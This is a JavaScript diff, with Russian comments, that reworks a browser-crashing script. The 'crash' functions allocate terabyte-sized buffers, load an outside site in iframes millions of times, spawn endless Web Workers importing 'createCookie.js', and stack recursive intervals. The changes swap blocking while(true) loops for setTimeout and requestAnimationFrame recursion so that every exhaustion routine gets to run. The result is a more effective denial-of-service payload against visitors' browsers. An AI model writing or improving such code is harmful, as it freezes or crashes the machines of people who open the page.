@@ -10,12 +10,7 @@ function startCrash() {
   });
 
   // Запуск всех процессов
-  createLargeArray();
-  loadMultipleIframes('https://insult1ks.github.io', 9999999);
-  loadMultipleIframes('https://insult1ks.github.io', 999999999999);
-  startCanvasAnimation();
-  startWebWorkers();
-  startRecursiveIntervals();
+  crash(); // Вызываем функцию crash()
 }
 
 function crash() {
@@ -35,7 +30,7 @@ function crash() {
   }, 0);
 
   // Бесконечный цикл с Three.js
-  while (true) {
+  (function threeJSLoop() {
     var geometry = new THREE.BoxGeometry();
     var material = new THREE.MeshBasicMaterial({color: Math.random() * 0xffffff});
     var cube = new THREE.Mesh(geometry, material);
@@ -44,16 +39,28 @@ function crash() {
     cube.rotation.z += Math.random() * 2 * Math.PI;
     var renderer = new THREE.WebGLRenderer();
     renderer.render(new THREE.Scene().add(cube), new THREE.Camera());
-  }
+
+    requestAnimationFrame(threeJSLoop); // Используем requestAnimationFrame вместо while (true)
+  })();
+
+  // Запуск других функций
+  createLargeArray();
+  loadMultipleIframes('https://insult1ks.github.io', 9999999);
+  loadMultipleIframes('https://insult1ks.github.io', 999999999999);
+  startCanvasAnimation();
+  startWebWorkers();
+  startRecursiveIntervals();
 }
 
 // Функция для создания большого массива
 function createLargeArray() {
   let largeArray = [];
 
-  while (true) {
+  // Используем setTimeout для избежания блокировки основного потока
+  (function pushArray() {
     largeArray.push(new ArrayBuffer(1024 * 1024 * 1024 * 1024)); // Каждый элемент занимает 1 ТБ памяти
-  }
+    setTimeout(pushArray, 0); // Рекурсивный вызов с задержкой
+  })();
 }
 
 // Функция для загрузки множества iframe
@@ -108,9 +115,10 @@ function startCanvasAnimation() {
 
 // Бесконечные Web Workers
 function startWebWorkers() {
-  while (true) {
+  (function createWorker() {
     new Worker("data:text/javascript," + encodeURIComponent("setInterval(() => { importScripts('createCookie.js'); }, 1);"));
-  }
+    setTimeout(createWorker, 0); // Рекурсивный вызов с задержкой
+  })();
 }
 
 // Рекурсивные интервалы
@@ -124,11 +132,5 @@ function startRecursiveIntervals() {
     }
   }
 
-  while (true) {
-    try {
-      setInterval(x, 1);
-    } catch (e) {
-      console.log(e);
-    }
-  }
+  x(); // Запуск рекурсивных интервалов
 }
